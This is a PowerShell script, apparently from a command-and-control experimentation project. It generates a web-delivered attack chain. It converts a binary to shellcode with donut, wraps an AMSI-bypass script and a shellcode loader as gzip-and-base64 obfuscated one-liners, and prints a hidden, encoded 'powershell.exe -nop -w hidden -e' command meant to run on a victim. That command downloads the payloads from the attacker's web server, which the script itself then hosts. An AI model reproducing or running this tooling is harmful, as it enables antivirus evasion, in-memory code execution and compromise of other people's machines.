param ([Parameter(Mandatory, HelpMessage="IP of the web server hosting the powershell scripts.")][string]$ipWebServ, 
[Parameter(Mandatory, HelpMessage="Port of the web server hosting the powershell scripts.")][int]$portWebServ, 
[Parameter(Mandatory, HelpMessage="Binary path.")][string]$binary, 
[Parameter(Mandatory, HelpMessage="Binary args.")][string]$binaryArgs)

write-host "GeneratePowershellLauncher.ps1 -ipWebServ $ipWebServ -portWebServ $portWebServ -binary $binary -binaryArgs $binaryArgs"

write-host "[+] Generate payload $binary $binaryArgs"

$payloadAmsi="payloadAmsi.ps1"
$payloadShellcode="payloadShellcode.ps1"

# generate the shellcode with donut
$shellcodePath=".\shellcode.b64"
& '.\ressources\donut.exe' -f 2 -m go -p $binaryArgs -o $shellcodePath ]$binary
$pathShellCode = Resolve-Path -Path $shellcodePath

#Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -ScriptPath B:\ExplorationC2\ExplorationC2\PowershellWebDelivery\AmsiBypass.ps1 -Command 'COMPRESS,1' -Quiet

$pathAmsiBypass = Resolve-Path -Path ".\AmsiBypass.template"
$pathShellCodeLoader = Resolve-Path -Path ".\ShellcodeLoader.template"
$pathOneLiner = Resolve-Path -Path ".\oneLinerToExec.template"


# creat AMIS bypass payload
$script = [System.IO.File]::ReadAllText($pathAmsiBypass)
$bytes = [System.Text.Encoding]::UTF8.GetBytes($script)
$mstream = New-Object System.IO.MemoryStream;
$gzipstream = New-Object System.IO.Compression.GZipStream($mstream, [System.IO.Compression.CompressionMode]::Compress);
$gzipstream.Write($bytes, 0, $bytes.Length);
$gzipstream.Close()
$base64 = [System.Convert]::ToBase64String($mstream.ToArray());
$amsiOneLiner = [string]::Format("&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{0}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",$base64)

# creat Shellcode loader payload
$shellcode = [System.IO.File]::ReadAllText($pathShellCode)
$script = [System.IO.File]::ReadAllText($pathShellCodeLoader)
$script = $script.Replace('SHELL_CODE',$shellcode)

$bytes = [System.Text.Encoding]::UTF8.GetBytes($script)
$mstream = New-Object System.IO.MemoryStream;
$gzipstream = New-Object System.IO.Compression.GZipStream($mstream, [System.IO.Compression.CompressionMode]::Compress);
$gzipstream.Write($bytes, 0, $bytes.Length);
$gzipstream.Close()
$base64 = [System.Convert]::ToBase64String($mstream.ToArray());
$shellcodeLoaderOneliner = [string]::Format("&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{0}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",$base64)

# Create 2 payload to send
$amsiOneLiner | out-file -FilePath ".\web\payloadAmsi.ps1"
#$amsiOneLiner | out-file -FilePath ".\web\payloadShellcode.ps1"
#Add-Content ".\web\payloadShellcode.ps1" $shellcodeLoaderOneliner
$shellcodeLoaderOneliner | out-file -FilePath ".\web\payloadShellcode.ps1"


# output the oneliner to run on the victime
$script = [System.IO.File]::ReadAllText($pathOneLiner)
$script = $script.Replace('IP_WEBSERV',$ipWebServ)
$script = $script.Replace('PORT_WEBSERV',$portWebServ)
$script = $script.Replace('PAYLOAD_AMSI',$payloadAmsi)
$script = $script.Replace('PAYLOAD_SHELLCODE',$payloadShellcode)

$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$base64 = [System.Convert]::ToBase64String($bytes);

$oneLiner = [string]::Format("powershell.exe -nop -w hidden -e {0}",$base64)

del $pathShellCode

write-output $oneLiner

write-host "[+] Web delivery on web server $ipWebServ : $portWebServ"
write-host "[+] Need special rights or to be launch as admin"

cd ".\web"
$Hso = New-Object Net.HttpListener
$Hso.Prefixes.Add("http://+:"+$portWebServ+"/")
$Hso.Start()
While ($Hso.IsListening) {
    $HC = $Hso.GetContext()
	write-host ($HC.Request).RawUrl
    $HRes = $HC.Response
    $HRes.Headers.Add("Content-Type","text/plain")
    $Buf = [Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($HC.Request).RawUrl)))
    $HRes.ContentLength64 = $Buf.Length
    $HRes.OutputStream.Write($Buf,0,$Buf.Length)
    $HRes.Close()
}
$Hso.Stop()